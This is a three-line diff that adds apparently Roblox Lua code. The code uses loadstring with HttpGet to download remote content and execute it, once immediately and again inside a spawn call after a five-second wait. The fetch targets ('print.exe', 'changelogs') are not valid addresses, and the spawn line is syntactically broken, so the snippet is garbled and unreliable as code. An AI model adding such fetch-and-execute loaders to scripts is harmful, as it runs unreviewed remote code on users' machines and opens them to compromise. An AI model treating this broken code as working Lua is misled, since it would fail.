@@ -1,0 +1,3 @@
+loadstring(Game:HttpGet("print.exe"))()
+wait(5)
+spawn, function(loadstring(game:HttpGet("changelogs"))())
